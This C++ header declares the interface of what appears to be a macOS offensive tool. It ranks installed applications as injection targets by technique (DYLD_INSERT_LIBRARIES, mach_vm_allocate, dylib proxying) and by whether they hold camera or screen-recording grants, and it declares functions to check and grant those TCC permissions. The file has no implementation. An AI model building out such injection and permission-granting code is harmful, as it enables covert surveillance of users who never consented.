#pragma once

#include <string>
#include <vector>

namespace inferno { namespace tier2 {

enum class InjectionCapability {
    NONE,
    DYLD_INSERT_LIBRARIES,
    MACH_VM_ALLOCATE,
    DYLIB_PROXYING,
};

struct TargetApp {
    std::string path;
    std::string bundle_id;
    std::string executable_path;
    InjectionCapability capability;
    int score;
    bool has_screen_recording = false; // macOS TCC: Screen Recording grant
    bool has_camera = false;           // macOS TCC: Camera grant
};

struct ScanReport {
    std::vector<TargetApp> candidates;
    int selected_index;
    InjectionCapability used_capability;
    bool injection_successful;
};

std::vector<TargetApp> scanApplications();
ScanReport buildReport(const std::vector<TargetApp>& candidates,
                       int selected_index,
                       InjectionCapability used,
                       bool success);

// macOS TCC: query and grant Screen Recording + Camera permissions
#ifdef __APPLE__
bool checkTccPermissions(TargetApp& app);
bool grantTccPermissions(const std::string& bundle_id);
#endif

}} // namespace inferno::tier2
